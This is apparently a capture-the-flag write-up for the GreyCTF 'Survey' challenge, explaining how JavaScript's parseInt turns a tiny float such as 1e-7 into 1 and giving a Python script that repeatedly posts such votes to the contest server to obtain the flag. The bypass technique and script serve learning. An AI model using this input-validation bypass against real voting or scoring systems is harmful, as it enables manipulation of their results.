---
title: Greyctf Survey Writeup
date: 2024-04-25
categories:
  - Writeups
tags:
  - Grey cat the flag
---

# Intro

- Recently I have participated in Grey Cat The Flag as a member in F1ag dot txt, and I counter some questions which are quite interesting. One of them is greyctf survey

# 0x01

### Source code:

index.js
```javascript
app.post('/vote', async (req, res) => {
    const {vote} = req.body;
    if(typeof vote != 'number') {
        return res.status(400).json({
            "error": true,
            "msg":"Vote must be a number"
        });
    }
    if(vote < 1 && vote > -1) {
        score += parseInt(vote);
        if(score > 1) {
            score = -0.42069;
            return res.status(200).json({
                "error": false,
                "msg": config.flag,
            });
        }
        return res.status(200).json({
            "error": false,
            "data": score,
            "msg": "Vote submitted successfully"
        });
    } else {
        return res.status(400).json({
            "error": true,
            "msg":"Invalid vote"
        });
    }
})

```

From the source code, we can see that we are able to send data by using post method to the endpoint '/vote'. And the data will be in json format:  {'votes': value}

The value need to be send will have to be in between 1 and -1, and it will be parsed into an integer and will be added to the 'score' variable, and once the value of score exceeds 1. It will return with flag

# 0x02

As such, we can use try to use burp to intercept the packet first and post a random data that is between 1 and -1 . But it turns out that the value it returns us is the exact same.

## parseInt() function

In Javascript, the parseInt() function parses a string argument and returns an integer of the specified radix (the base in mathematical numeral systems)(https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt)

It has two parameter(here we only require to use one): String and radix(we do not need use this one at this circumstance)

Tips: 
1. If the string start with a "0x", Javascript will interpret it as a hexadecimal number
2. If the typeof value is not a string, Javascript will implicitly call the `toString()` to convert it into a string by default.

The parseInt() will starts parsing from the beginning of the string until it encounters a non-numeric character or reaches the end of the string with whitespace ignoring . If the first non-whitespace character is not numeric character, plus or negative. It will return a value of NaN.

For instance:

```javascript:
console.log(parseInt('123abc'))//123
console.log(parseInt(' 1'))//1
console.log(parseInt('a'))//NaN
```

Similarly, if the value is a decimal(float), it will return the number before decimal point, as '.' is considered as non-numeric

```javascript
console.log(parseInt(0.05))//0
```

It will return a value of 0, and that explains why the score remain exact same why we post a value(-1 < value < 1), as it will be parsed to 0.

# 0x03

## Standard form

However, in javascript, when a number has more than 6 decimal places, it will automatically transformed into standard form.

For instance:

```javascript
console.log(0.0000001)//1e-7
```


Therefore, back to the parseInt() function again, once we post a value that exceeds 6 decimals places, parseInt() lt will only parse the part of the string before the "e" character:

For instance:

```javascript
0.0000001 -> 1e-7
```

The first number that parseInt() will parse will be 1 and end before the "e" character

As such, we can use this and post a data that is more than 6 decimal places.

![[Pasted image 20240421151522.png]]

By doing it, we can find the value changing, and by doing it twice, we are able to make the score more than 1.

As it exceeds 1, it returns us with the flag.

# 0x04
## Python

```python
exp.py

#!/usr/bin/python3
import requests
import json

def solve():
    try:
        # url
        url = 'http://challs.nusgreyhats.org:33334/vote'
        # header
        header = {
            "Content-Type": "application/json; charset=utf-8"
        }
        # payload
        payload = '''
        {"vote":0.0000000000000000001}    
        '''
        reponse = requests.post(url, data=payload,headers=header)
        # if the score still do not exceeds 1
        # flag format: "grey{...}"
        while "grey{" not in reponse.text:
            reponse = requests.post(url, data=payload,headers=header)
        # flag 
        flag = json.loads(reponse.text)['msg']
        print(flag)
    except Exception as e:
        print(e)

if __name__ == "__main__":
    solve()

```


Reference: 
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt
http://t.csdnimg.cn/EU6uo
http://t.csdnimg.cn/yGCjd
